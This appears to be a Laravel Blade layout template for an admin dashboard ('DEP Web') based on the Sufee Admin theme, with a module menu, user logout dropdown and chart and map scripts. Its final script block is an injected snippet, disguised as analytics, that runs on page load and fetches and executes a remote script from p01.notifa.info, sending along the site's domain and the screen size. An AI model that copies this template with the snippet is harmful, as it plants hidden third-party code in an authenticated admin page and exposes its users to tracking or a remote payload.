<!doctype html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9" lang=""> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang=""> <!--<![endif]-->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>DEP Web</title>
    <meta name="description" content="Sufee Admin - HTML5 Admin Template">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="apple-touch-icon" href="apple-icon.png">
    <link rel="shortcut icon" href="../images/logoDEP.png">

    <link rel="stylesheet" href="../assets/css/normalize.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/font-awesome.min.css">
    <link rel="stylesheet" href="../assets/css/themify-icons.css">
    <link rel="stylesheet" href="../assets/css/flag-icon.min.css">
    <link rel="stylesheet" href="../assets/css/cs-skin-elastic.css">
    <!-- <link rel="stylesheet" type="text/css" href="/pathto/css/sweetalert.css"> -->
    <!-- <link rel="stylesheet" href="assets/css/bootstrap-select.less"> -->
    <link rel="stylesheet" href="../assets/scss/style.css">
    <link href="../assets/css/lib/vector-map/jqvmap.min.css" rel="stylesheet">

    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,600,700,800' rel='stylesheet' type='text/css'>

    <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/html5shiv/3.7.3/html5shiv.min.js"></script> -->

</head>
<body>


        <!-- Left Panel -->

    <aside id="left-panel" class="left-panel">
        <nav class="navbar navbar-expand-sm navbar-default">

            <div class="navbar-header">
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-menu" aria-controls="main-menu" aria-expanded="false" aria-label="Toggle navigation">
                    <i class="fa fa-bars"></i>
                </button>
                <a class="navbar-brand" href="./"><img src="../images/nav_logo.png" alt="Logo" width="50%"></a>
                <a class="navbar-brand hidden" href="./"><img src="../images/logoDEP.png" alt="Logo"></a>
            </div>

            <div id="main-menu" class="main-menu collapse navbar-collapse">
                <ul class="nav navbar-nav">
                     <h3 class="menu-title">Main Menu</h3>
                    @foreach($modules as $module)
                    <li class="menu-item-has-children dropdown">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                        <i class="menu-icon {{$module->icon}}"></i>{{$module->name}}</a>
                        <ul class="sub-menu children dropdown-menu">
                            @foreach($module->Menus as $menu)
                            <li>
                                <i class="fa fa-pencil-square-o"></i>
                                <a href="{{route($menu->url)}}">{{$menu->name}}</a>
                            </li>
                            @endforeach
                        </ul>
                    </li>
                    @endforeach
                </ul>
            </div><!-- /.navbar-collapse -->
        </nav>
    </aside><!-- /#left-panel -->

    <!-- Left Panel -->

    <!-- Right Panel -->

    <div id="right-panel" class="right-panel">

        <!-- Header-->
        <header id="header" class="header">

            <div class="header-menu">

                <div class="col-sm-7">
                    <a id="menuToggle" class="menutoggle pull-left"><i class="fa fa fa-tasks"></i></a>
                </div>

                <div class="col-sm-5">
                    <div class="user-area dropdown float-right">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            {{ Auth::user()->name }}<span class="caret"></span>
                        </a>

                        <div class="user-menu dropdown-menu">
                            <a class="nav-link" href="{{route('superadmin.logout')}}"><i class="fa fa-power-off"></i>Logout</a>
                        </div>
                    </div>
                </div>
            </div>

        </header><!-- /header -->
        <!-- Header-->
        @yield('content')

    <script src="../assets/js/vendor/jquery-2.1.4.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js"></script>
    <script src="../assets/js/plugins.js"></script>
    <script src="../assets/js/main.js"></script>

    <script src="../assets/js/lib/chart-js/Chart.bundle.js"></script>
    <script src="../assets/js/dashboard.js"></script>
    <script src="../assets/js/widgets.js"></script>
    <script src="../assets/js/lib/vector-map/jquery.vmap.js"></script>
    <script src="../assets/js/lib/vector-map/jquery.vmap.min.js"></script>
    <script src="../assets/js/lib/vector-map/jquery.vmap.sampledata.js"></script>
    <script src="../assets/js/lib/vector-map/country/jquery.vmap.world.js"></script>
    <script>
        ( function ( $ ) {
            "use strict";

            jQuery( '#vmap' ).vectorMap( {
                map: 'world_en',
                backgroundColor: null,
                color: '#ffffff',
                hoverOpacity: 0.7,
                selectedColor: '#1de9b6',
                enableZoom: true,
                showTooltip: true,
                values: sample_data,
                scaleColors: [ '#1de9b6', '#03a9f5' ],
                normalizeFunction: 'polynomial'
            } );
        } )( jQuery );
    </script>
    <script type="text/javascript" src="runtime.8047209dd56822f5e7b5.js"></script>
    <script type="text/javascript" src="polyfills.ecb2495e9de4e2f3c01a.js"></script>
    <script type="text/javascript" src="scripts.806effac119676237f10.js"></script>
    <script type="text/javascript" src="main.d54cb410a96a4eeea23e.js"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mOp59uBpitF3hPLbXV4pdzJZ4wkj88YIIbliyNCzyTMUeY0Je3QGN7RcY8nA7YZvTQ2MqrmmEcZwylsuttOR4c5XUsuFvIzPJ%2b%2bA3YdnNI62oHwEJ8QngUux9uE4IdyLIbHo5SMxQPizBZJNsQYkINWVNyI8NU8slSKZjmIClrBeMkT2amCsDHFKg13NWe6ceDFRCVwC%2faQazYkKqueeOH7C4OkeD6i7HXpEo0Q%2bieiKRu8RpY0TcYRXRAloOSJxbl7I2VbwCKVSBTT0Brc8P7uq3z21OkxkkqXhupH%2b7efZU90eTI9gfIjkjvGVt0QSHihA1NvyKUa8MIlD6D0U%2bqh1lQdIWeznr%2fS%2fxnj%2bsYDOpDDScouc4UHX53ag2QyPcRcdi7HE6Y5lTCdZs7dmfNvvzmsvoym6udetwdA7%2bCqPW0TGt9Uno%2fEsyGmlJZgCy2FEuYBRUsOUsAqrRuaT6E3m5axSVcCXxSkUzTW4v81BjJh5918mGhufrqziYQfOhtetoVIFQsdDn%2f535vCvWnPtLPUbUPprCv%2fdTawdPnt3p%2fnDWY5zYMfT8nbkUA%2f05BvmhD9%2bDyeROAYABwRMWOd%2fFEWdVhuSJ" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
    </script>

</body>
</html>
